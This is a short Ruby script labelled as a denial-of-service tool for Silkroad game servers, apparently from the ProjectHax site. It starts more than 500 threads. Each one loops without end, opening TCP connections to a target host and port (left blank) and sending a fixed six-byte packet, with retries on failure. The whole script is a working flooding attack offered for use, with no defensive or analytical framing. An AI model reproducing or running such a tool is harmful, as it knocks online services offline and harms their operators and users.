require 'socket'

puts 'Ruby Silkroad DoS - ProjectHax.com'

$host = ''
$port = 0

$payload = [ 0x00, 0x00, 0x01, 0x20, 0x00, 0x00 ].pack('C*')

def DOS
        while 1
                begin
                        s = TCPSocket.new($host, $port)
                        s.write($payload)
                rescue
                        sleep(0.01)
                        retry
                end

                sleep(0.001)
        end
end

for x in 0..500
        t = Thread.new do
                DOS()
        end
end

DOS()